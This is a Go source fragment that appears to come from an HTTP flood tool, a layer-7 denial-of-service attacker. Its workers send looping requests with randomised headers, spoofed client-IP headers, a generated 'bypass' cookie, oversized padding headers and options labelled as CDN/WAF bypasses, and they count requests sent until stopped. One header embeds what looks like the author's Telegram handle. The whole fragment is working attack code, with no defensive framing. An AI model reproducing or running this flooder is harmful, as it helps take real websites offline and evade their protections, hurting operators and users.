				headers = append(headers, headerItem{"Sec-Fetch-Mode", prof.SecFetchMode})
				headers = append(headers, headerItem{"Sec-Fetch-Dest", prof.SecFetchDest})
				if prof.DNT != "" {
					headers = append(headers, headerItem{"DNT", prof.DNT})
				}

				if rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"TE", "trailers"})
				}
				if rng.Intn(4) == 0 {
					headers = append(headers, headerItem{"A-IM", "Feed"})
				}
				if rng.Intn(4) == 0 {
					headers = append(headers, headerItem{"Delta-Base", "12340001"})
				}
				if rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"dnt", "1"})
				}
				if rng.Intn(4) == 0 {
					headers = append(headers, headerItem{"Access-Control-Request-Method", "GET"})
				}
				if rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"source-ip", randStr(rng, 5)})
				}
				if rng.Intn(4) == 0 {
					headers = append(headers, headerItem{"Data-Return", "false"})
				}

				if bypassSupport["X-Original-URL"] && rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"X-Original-URL", "/" + strconv.FormatInt(rng.Int63(), 16)})
				}
				if bypassSupport["X-Forwarded-Host"] && rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"X-Forwarded-Host", strconv.FormatInt(rng.Int63(), 16) + "t.me/ytdizflyze"})
				}
				if bypassSupport["X-Request-ID"] && rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"X-Request-ID", strconv.FormatInt(rng.Int63(), 16)})
				}
				if bypassSupport["CF-Connecting-IP"] && rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"CF-Connecting-IP", realIP})
				}
				if bypassSupport["True-Client-IP"] && rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"True-Client-IP", realIP})
				}
				if bypassSupport["CDN-Loop"] && rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"CDN-Loop", "cloudflare"})
				}
				if rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"X-Real-IP", realIP})
				}
				if maxHeaderSize > 0 && rng.Intn(2) == 0 {
					size := maxHeaderSize/2 + rng.Intn(maxHeaderSize/2)
					if size < 1 {
						size = 512
					}
					headers = append(headers, headerItem{"X-Large-Data", strings.Repeat("x", size)})
				}

				var cookies []string
				if globalCookie != "" {
					cookies = append(cookies, globalCookie)
				}
				cookies = append(cookies, generateBypassCookie())
				for _, name := range cookieNames {
					if rng.Intn(2) == 0 {
						cookies = append(cookies, name+"="+strconv.FormatInt(rng.Int63(), 16))
					}
				}
				if len(cookies) > 0 {
					headers = append(headers, headerItem{"Cookie", strings.Join(cookies, "; ")})
				}

				headers = append(headers, headerItem{"X-Forwarded-For", realIP})
				headers = append(headers, headerItem{"X-Real-IP", realIP})
				headers = append(headers, headerItem{"Range", "bytes=0-"})
				headers = append(headers, headerItem{"If-None-Match", `"` + randStr(rng, 16) + `"`})
				headers = append(headers, headerItem{"Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"})
				headers = append(headers, headerItem{"Accept-Language", "en-US,en;q=0.9,id;q=0.8"})
				headers = append(headers, headerItem{"X-Forwarded-For", realIP + ", " + randIP(rng)})
				headers = append(headers, headerItem{"X-Originating-IP", realIP})
				headers = append(headers, headerItem{"X-Remote-IP", realIP})
				headers = append(headers, headerItem{"X-Remote-Addr", realIP})
				headers = append(headers, headerItem{"X-Client-IP", realIP})

				rng.Shuffle(len(headers), func(i, j int) {
					headers[i], headers[j] = headers[j], headers[i]
				})
				req.Header = make(http.Header)
				for _, h := range headers {
					req.Header.Set(h.key, h.value)
				}

				resp, err := cli.client.Do(req)
				if err == nil {
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
					atomic.AddInt64(&totalRequests, 1)
				} else {
					atomic.AddInt64(&totalErrors, 1)
				}
			}
		}(cw, w)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	select {
	case <-sig:
		cancel()
	case <-ctx.Done():
	}
	wg2.Wait()
	fmt.Println()
	fmt.Printf("Total requests: %d, Errors: %d\n", totalRequests, totalErrors)
}
